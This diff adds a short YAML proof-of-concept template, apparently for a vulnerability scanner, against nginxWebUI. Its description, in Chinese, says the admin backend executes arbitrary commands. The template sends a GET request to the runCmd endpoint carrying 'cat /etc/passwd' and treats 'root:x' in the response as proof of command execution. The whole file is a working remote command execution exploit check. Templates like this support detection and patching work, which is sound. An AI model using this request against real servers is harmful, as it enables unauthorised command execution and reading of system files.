@@ -1,0 +1,9 @@
+name: poc-yaml-nginxWebUI-runCmd
+description: "后台执行任意命令"
+method: GET
+path:
+  - /AdminPage/conf/runCmd?cmd=cat%20/etc/passwd
+expression:
+  status: 200
+  body_any:
+    - "root:x"
